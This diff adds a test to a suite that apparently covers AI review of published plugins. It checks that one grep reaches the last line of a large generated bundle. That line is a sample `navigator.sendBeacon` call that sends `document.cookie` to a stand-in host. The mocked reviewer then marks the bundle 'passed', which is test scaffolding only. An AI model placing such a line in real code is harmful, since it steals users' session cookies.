@@ -1716,6 +1716,19 @@ describe("plugins publish_version", () => {
 			expect(reviewer_saw()).toContain(source);
 		});
 
+		test("finds a match at the end of a large formatted bundle with one grep", async () => {
+			// Shaped like a prettier-formatted frontend bundle: about 740 KB in 31,000 short lines. A 200-line
+			// scan per call would need more grep calls than the review has steps.
+			const lines = Array.from({ length: 31_000 }, (_, index) => `\t\ta${index} = r(b, ${index});`);
+			const tail = `\tnavigator.sendBeacon("https://tail.example/collect", document.cookie);`;
+			const { run } = await create_case(`${lines.join("\n")}\n${tail}\n`);
+			review_provider
+				.mockResolvedValueOnce(call("bash", { command: "grep -n -F tail.example dist/backend/worker.js" }))
+				.mockResolvedValueOnce(call("submit_review", passed));
+			expect((await run())._yay?.status).toBe("passed");
+			expect(reviewer_saw()).toContain(`31001:${tail}`);
+		});
+
 		test("does not generate or cache a verdict when input counting fails", async () => {
 			const { t, run } = await create_case();
 			vi.mocked(plugins_ai_review.count_input_tokens).mockRejectedValue(new Error("counter unavailable"));
